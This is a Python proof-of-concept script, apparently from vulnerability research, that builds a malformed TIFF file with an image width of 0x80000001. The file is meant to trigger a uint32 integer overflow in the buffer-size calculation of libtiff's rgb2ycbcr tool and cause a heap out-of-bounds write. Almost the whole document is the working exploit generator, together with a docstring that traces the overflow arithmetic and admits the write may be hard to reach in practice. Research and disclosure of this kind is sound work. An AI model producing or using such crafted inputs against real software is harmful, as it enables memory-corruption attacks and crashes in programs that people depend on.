#!/usr/bin/env python3
"""
VULN 001 PoC generator: Integer overflow in cvtRaster() output-buffer size
Tool: rgb2ycbcr (tools/rgb2ycbcr.c lines 250-264)

Integer overflow path:
  width = 0x80000001 (2147483649)
  height = 1
  rwidth  = roundup(0x80000001, horizSubSampling=2) = 0x80000002
  rheight = roundup(1, vertSubSampling=2) = 2
  nrows   = min(rowsperstrip=0xFFFFFFFF, rheight=2) = 2
  rnrows  = roundup(2, 2) = 2
  cc = rnrows*rwidth + 2*((rnrows*rwidth)/(h*v))
     = 2 * 0x80000002 + ...   <-- uint32 multiply overflows!
     = 0x100000004 & 0xFFFFFFFF = 4 => cc = 4 + 2*(4/4) = 6
  _TIFFmalloc(6) is called but cvtStrip would need to write ~8GB -> heap OOB

NOTE: In practice TIFFReadRGBAImage() attempts to allocate a raster of
width*height*4 = ~8.6 GB, which fails (OOM) before reaching cvtStrip.
The overflow in cc IS a real integer overflow (UBSAN would catch it at the
multiplication point), but the heap-buffer-overflow write in cvtStrip is
only reachable on systems with sufficient RAM / overcommit.
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.tif")

# --- TIFF constants ---
TIFF_MAGIC_LE = b'II'   # Little-endian
TIFF_VERSION   = 42

TYPE_SHORT = 3
TYPE_LONG  = 4

TAG_IMAGEWIDTH      = 0x0100
TAG_IMAGELENGTH     = 0x0101
TAG_BITSPERSAMPLE   = 0x0102
TAG_COMPRESSION     = 0x0103
TAG_PHOTOMETRIC     = 0x0106
TAG_STRIPOFFSETS    = 0x0111
TAG_SAMPLESPERPIXEL = 0x0115
TAG_ROWSPERSTRIP    = 0x0116
TAG_STRIPBYTECOUNTS = 0x0117

# Trigger values
IMAGE_WIDTH  = 0x80000001   # causes uint32 overflow in rnrows*rwidth
IMAGE_LENGTH = 1

# Tiny strip payload (3 RGB bytes = 1 pixel - tool will fail on raster alloc
# before writing, but TIFF must be structurally valid for libtiff to parse it)
STRIP_DATA = b'\xff\x00\x00'   # 1 red pixel (RGB)

def pack_ifd_entry(tag, type_, count, value_or_offset):
    """Pack a 12-byte IFD entry."""
    return struct.pack('<HHII', tag, type_, count, value_or_offset)

def build_tiff():
    # IFD starts right after the 8-byte TIFF header
    ifd_offset = 8

    # IFD entries (must be sorted by tag)
    entries = []
    entries.append((TAG_IMAGEWIDTH,      TYPE_LONG,  1, IMAGE_WIDTH))
    entries.append((TAG_IMAGELENGTH,     TYPE_LONG,  1, IMAGE_LENGTH))
    entries.append((TAG_BITSPERSAMPLE,   TYPE_SHORT, 1, 8))          # 8 bps
    entries.append((TAG_COMPRESSION,     TYPE_SHORT, 1, 1))          # no compression
    entries.append((TAG_PHOTOMETRIC,     TYPE_SHORT, 1, 2))          # RGB
    # STRIPOFFSETS placeholder - will be filled in after we know the offset
    entries.append((TAG_STRIPOFFSETS,    TYPE_LONG,  1, 0))          # placeholder
    entries.append((TAG_SAMPLESPERPIXEL, TYPE_SHORT, 1, 3))
    entries.append((TAG_ROWSPERSTRIP,    TYPE_LONG,  1, IMAGE_LENGTH))
    entries.append((TAG_STRIPBYTECOUNTS, TYPE_LONG,  1, len(STRIP_DATA)))

    num_entries = len(entries)
    # IFD size: 2 (count) + num_entries*12 + 4 (next IFD offset)
    ifd_size = 2 + num_entries * 12 + 4
    strip_data_offset = ifd_offset + ifd_size

    # Patch STRIPOFFSETS with real value
    patched_entries = []
    for tag, type_, count, val in entries:
        if tag == TAG_STRIPOFFSETS:
            val = strip_data_offset
        patched_entries.append((tag, type_, count, val))

    # Build the binary
    header = struct.pack('<HHI', 0x4949, TIFF_VERSION, ifd_offset)

    ifd = struct.pack('<H', num_entries)
    for tag, type_, count, val in patched_entries:
        ifd += pack_ifd_entry(tag, type_, count, val)
    ifd += struct.pack('<I', 0)  # next IFD = none

    return header + ifd + STRIP_DATA

def main():
    data = build_tiff()
    with open(OUT_FILE, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
    print(f"[+] ImageWidth=0x{IMAGE_WIDTH:08X} ({IMAGE_WIDTH}), ImageLength={IMAGE_LENGTH}")
    print(f"[+] Expected overflow: rnrows=2, rwidth=0x{IMAGE_WIDTH+1:08X}")
    print(f"[+] 2 * rwidth = 0x{2*(IMAGE_WIDTH+1) & 0xFFFFFFFF:08X} (overflows uint32)")

if __name__ == '__main__':
    main()
